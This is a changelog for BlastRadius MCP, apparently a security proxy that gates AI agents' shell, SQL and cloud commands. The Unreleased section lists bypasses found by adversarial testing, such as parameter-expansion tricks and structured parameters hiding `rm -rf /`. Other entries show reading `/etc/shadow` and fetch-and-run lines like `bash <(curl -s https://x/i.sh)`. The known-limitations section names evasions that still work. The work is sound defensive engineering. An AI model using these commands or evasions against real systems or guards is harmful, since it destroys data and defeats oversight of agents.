# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Fixed

Found by an adversarial multi-agent simulation run before launch. Every item was
reproduced against the built engine first, then fixed, then pinned by a probe
script in `scripts/`.

- **Structured tool parameters were invisible to every rule.**
  `{command:'rm', args:['-rf','/']}` — the shape `enforce_policy` actually receives
  — contains no `rm -rf /` substring, so the engine scored it 5 SAFE and every
  forbidden-pattern rule passed. Each command-bearing leaf is now resolved
  independently and the highest score wins. This was the single worst gap found.
- **The policy gate could be more permissive than the engine.** The rule loop
  matches text; the blast report is the authority on what the call does. A policy
  may now set `engineCriticalBlocks`, enabled on the built-in zero-trust policy, so
  a CRITICAL irreversible verdict cannot be downgraded to "needs a token" on the
  strength of a text match. Off by default for custom policies, because a custom
  policy is an organisation's explicit statement and silently overriding a
  disabled rule would make `enabled: false` a lie.
- **The default policy bypassed the resolver.** `ZT-001` and `ZT-004` matched
  `JSON.stringify(params)`, so `D=/etc; cat $D/shadow` never matched the literal
  path and never blocked. Protected paths and forbidden patterns are now also
  matched against the resolved command.
- **Parameter modifiers were unsupported.** `${HOME:0:1}`, `${!HOME}`, `${#HOME}`
  and `${D[@]}` all executed `rm -rf /` while scoring 5 SAFE. Substring, indirect,
  length and array forms are now resolved.
- **Process substitution was untracked.** `bash <(curl -s https://x/i.sh)` reported
  `traits: []` and scored 5 SAFE. `<(` and `>(` are now tracked, and a process
  substitution feeding an interpreter raises a trait.
- **Arithmetic expansion was mangled.** `$(( 0x2f ))` produced `rm -rf /`. It now
  evaluates before `$(`-scanning, which was the actual ordering bug.
- **Execution sinks were not sinks.** `eval`, `exec`, `source`, `.`, `xargs` and
  `nohup` now resolve their argument as a program, and `eval "$(curl ...)"` is
  caught. Base64 decode feeding a pipe or sink is detected, as is
  `os.system(b64decode(...))` inside an inline program.
- **Five false positives at 85-90 CRITICAL.** `piped-to-interpreter` fired on `&&`
  adjacency rather than on an actual pipe, so `npm run build && bash postbuild.sh`
  and `cat f.json | python3 -m json.tool` scored 90. `find-delete` fired on any
  `-delete`, so `find . -name '*.pyc' -delete` scored 90. Both are now scoped, and
  the false-positive corpus was rewritten to include the cases that previously
  passed only because the probe was not adversarial.
- **Newline was not a command separator**, so multi-line scripts — the normal shape
  an agent sends — collapsed into a single segment.
- **Nested `$(...)` was mangled** by a non-greedy match that stopped at the first
  `)`.
- **`rm -rf $VAR` scored 100 on any unknown variable.** `TARGET=$PWD/build; rm -rf
  $TARGET`, which is ordinary scripting, was CRITICAL. The unknown-variable
  placeholder is now reserved for variables that conventionally hold a root or home
  path.
- **`/var/tmp` was treated as a system path**, so deleting a cache directory scored
  95.
- **Brace expansion was absent.** `rm -rf /{etc,var,home}` scored 5 SAFE.
- **Four ruleset gaps:** `rsync -a --delete`, `docker system prune -af`,
  `redis-cli FLUSHALL`, `aws s3 rm --recursive` all scored SAFE. Added as
  `FS-002` and `DB-001`.
- **The audit ledger signature did not cover the fields it claimed to.** The
  signature was `HMAC(currentHash)` while `currentHash` omits `severity`,
  `category`, `reasons` and `dlpFindingsCount`, so rewriting any of them still
  verified as intact — and those four are exactly what the sequence detector reads.
  The signature now covers the whole entry body.
- **Tail truncation was undetectable.** Deleting the last entries, including a
  BLOCK, left a chain that verified cleanly. A separately-persisted head anchor now
  detects it.
- **Head deletion was undetectable.** Removing the earliest entries left a
  consistent chain. Verification now requires the first entry to be at genesis.
- **`unresolvedVariables` was a dead field**, returning `[]` on exactly the cases
  where expansion had failed, and reporting false confidence to a reviewer.

### Added

- **Shell-aware command resolution** (`src/analyzer/shellResolver.ts`). Quote
  removal, variable assignment tracking, parameter expansion including modifiers,
  arithmetic and array forms, command and process substitution, brace expansion,
  newline-aware pipeline splitting, inline program extraction, and interpreter
  detection — all without executing anything.
- **Sequence and workflow detection** (`src/analyzer/sequenceDetector.ts`), wired
  into `enforce_policy`. Five patterns over the hash-chained decision log. It can
  only tighten a decision, never loosen one, cites evidence by entry index, and
  reports `truncated: true` when its window excludes where a pattern began.
- **An engine floor in the policy gate**, so text rules cannot permit what the
  engine has already scored as irrecoverable.
- **Six probe scripts** under `scripts/` that gate the security properties directly:
  `probe-guardfall`, `probe-redteam`, `probe-false-positives`, `probe-adversarial`,
  `probe-ledger-integrity`, `probe-policy-gap`.
- `BLAST_RADIUS_AUDIT_PATH`, a real Apache-2.0 `LICENSE` that was 0 bytes, a working
  multi-stage `Dockerfile`, an MCPB `manifest.json` replacing the dead
  `smithery.yaml`, GitHub Actions CI on Node 22 and 24, CodeQL, Dependabot,
  `SECURITY.md`, and `CONTRIBUTING.md`.
- 104 tests: 41 to 145, covering the resolver, the bypass classes, false-positive
  pinning, structured parameters, ledger tampering in all four modes, and a full
  JSON-RPC lifecycle over stdio.

### Removed

- **The license tier system.** `BLAST_RADIUS_LICENSE_KEY`, the Community/Pro/
  Enterprise table, per-hour rate limits, x402 micropayments, and SIEM export were
  advertised but did not exist in any form. BlastRadius is fully open source with
  no license key and no rate limit.

### Known limitations

- Resolution does not decode payloads built by string concatenation, `chr()`
  reassembly, or a hand-rolled decoder. Decode-and-execute detection is a
  heuristic.
- The structured-parameter walk is capped at depth 6, 64 leaves and 3 re-entry
  levels. Deeper nesting is not reached.
- Two-step staging where an interpreter is named with a bare filename
  (`bash /tmp/p` written by an earlier call) scores SAFE. Closing it needs
  cross-call state, which belongs to the sequence detector.
- Non-shell execution surfaces (`fs.rm`, `shutil.rmtree`, a library call that
  deletes by path) never reach the resolver. The engine scores strings; it does not
  model an API's semantics.
- `git push --force-with-lease` scores HIGH (85). It rewrites history, so requiring
  confirmation is deliberate. It is the only routine command in the false-positive
  probe that reaches HIGH.
- The audit ledger is tamper-*evident*, not tamper-proof. An attacker with write
  access to the log, the anchor file, and the signing key is outside its model.

## [1.0.0]

First stable release of BlastRadius MCP: a zero-trust security, blast-radius
simulation, and DLP proxy MCP server. Everything below is verified against the
code in this tag.

### Added

#### MCP tools

Six tools exposed over the stdio transport:

- `simulate_action` — pre-execution blast radius simulation for a shell command,
  SQL query, cloud operation, or file path. Returns a danger score, severity,
  affected entities, reversibility, mitigations, and a dry-run simulation.
- `inspect_payload_dlp` — DLP scan of arbitrary text, code, or log payloads,
  returning per-finding type, category, severity, and position plus a masked
  copy of the input.
- `enforce_policy` — the central decision point. Scans parameters with DLP,
  evaluates blast radius, applies the active policy, and writes a cryptographic
  audit record. Returns `PROCEED`, `BLOCKED`, or a confirmation requirement,
  with the audit receipt.
- `request_confirmation_token` — issues a time-bounded, HMAC-SHA256 signed
  step-up approval token scoped to a single tool name and action fingerprint.
- `verify_audit_log` — recomputes the audit hash chain over a recent window and
  reports whether it is intact, naming the first tampered index if not.
- `get_security_posture` — live counters (invocations, blocked calls, DLP
  redactions, critical actions simulated), the active policy name, the build
  edition and license status, and audit chain status.

#### Blast radius analysis

- 17 hand-written danger signatures across four categories: 8 `SH-` shell,
  5 `SQL-`, 3 `CLD-` cloud (AWS/GCP/Azure/Kubernetes), and 1 `FS-` filesystem
  rule. Each carries a score, severity, human-readable reason, destructive and
  irreversible flags, and concrete mitigations.
- Coverage includes recursive and wildcard deletion, raw disk writes, fork
  bombs, `curl | sh`, permissive `chmod`, system halt and reboot, destructive
  git operations, Windows registry and System32 deletion, `DROP DATABASE`/`SCHEMA`,
  `DROP`/`TRUNCATE TABLE`, unbounded `DELETE` and `UPDATE`, `GRANT ALL
  PRIVILEGES`, cloud resource and cluster termination, IAM entity deletion, and
  access to credential files such as `.env`, `id_rsa`, and `/etc/shadow`.
- 0–100 danger score with five severity bands: `SAFE` (0–14), `LOW` (15–39),
  `MEDIUM` (40–69), `HIGH` (70–89), `CRITICAL` (90–100).
- Automatic action category inference (SHELL, SQL, CLOUD, FILESYSTEM, NETWORK,
  GENERIC) when the caller does not supply one.
- Affected-entity extraction: SQL tables and databases, filesystem paths
  including Windows drive paths, and cloud resource IDs from `--instance-ids`,
  `--bucket`, `--cluster-name`, `--role-name`, and `--stack-name`.
- Production-context escalation: when `context.environment` is `prod`,
  `production`, `live`, or `main`, any score above 20 is raised by 20 points
  (capped at 100) and multi-party authorization is recommended.
- Reversibility reporting: `rollbackFeasible` is derived from whether any
  matched rule is irreversible and whether the score reached the critical band.
- Non-matching input scores 5 (`SAFE`) rather than 0, so a report is never
  indistinguishable from "not analysed".

#### Deep Data Loss Prevention

- 11 detectors covering credentials, secrets, and PII: AWS access key IDs,
  GitHub PATs, OpenAI API keys, Stripe live keys, Slack tokens, SSH private
  keys, database connection URI passwords, generic JWTs, credit card numbers,
  US SSNs, and email addresses.
- Findings report a masked preview rather than the raw value. Masking preserves
  the last four characters so values stay recognizable without being usable.
- Masks are applied by default and can be disabled per call with
  `maskSensitive: false` to report positions only.

#### Cryptographic audit ledger

- Append-only JSONL ledger (`blastradius-audit.jsonl` in the working directory).
- SHA-256 hash chain: each entry hashes its index, timestamp, tool name, caller,
  decision, danger score, an input hash, and the previous entry's hash, seeded
  from an all-zero genesis hash.
- Every entry is additionally signed with HMAC-SHA256 using
  `BLAST_RADIUS_AUDIT_KEY`, or an ephemeral random key when unset.
- Integrity verification detects both edited entries and broken links, and
  reports the offending index.

#### Policy engine

- Three decisions: `ALLOW`, `BLOCK`, and `REQUIRE_CONFIRMATION`.
- Two shipped policies: `Default Zero-Trust Shield` (hard blocks on root and
  wildcard deletion, fork bombs and raw partition writes, and access to secret
  or auth files; step-up approval required at `HIGH` severity or above and for
  any destructive action) and `Read-Only Audit Guard` (default `BLOCK`, allowing
  only non-destructive inspection).
- Rules are declarative and data-driven: forbidden pattern matching, protected
  path matching, severity thresholds, per-tool allow and deny lists, and a
  destructive-action approval flag.

#### Step-up approval

- HMAC-SHA256 signed approval tokens with an issuer, tool scope, action
  fingerprint, reason, and expiry, using `BLAST_RADIUS_SIGNING_KEY` or an
  ephemeral random key.
- Signature comparison is constant time, and tokens are rejected when expired or
  scoped to a different tool.

#### Transparent proxy mode

- `blastradius-mcp proxy --command "<cmd>"` wraps any existing stdio MCP server
  with no changes to that server.
- Inbound `tools/call` requests are DLP-scanned, blast-radius evaluated, and
  policy checked before being forwarded. `BLOCK` returns a JSON-RPC `-32000`
  error; `REQUIRE_CONFIRMATION` returns `-32001` with the danger score.
- Outbound responses are re-scanned and redacted before the client sees them, so
  a downstream server cannot leak a credential the DLP scanner would have caught
  on the way in.
- Non-`tools/call` traffic and unparseable lines pass through untouched, so
  protocol traffic stays transparent.

#### Packaging and distribution

- Published to npm as `blastradius-mcp` with `blastradius-mcp` as the bin name.
- Two runtime dependencies: `@modelcontextprotocol/sdk` and `zod`.
- Requires Node.js 22 or newer.
- Client configuration examples for Claude Desktop, Cursor, VS Code, and Claude
  Code, plus a worked custom policy file.
- Repository metadata for Smithery and Glama.
- Apache License 2.0.
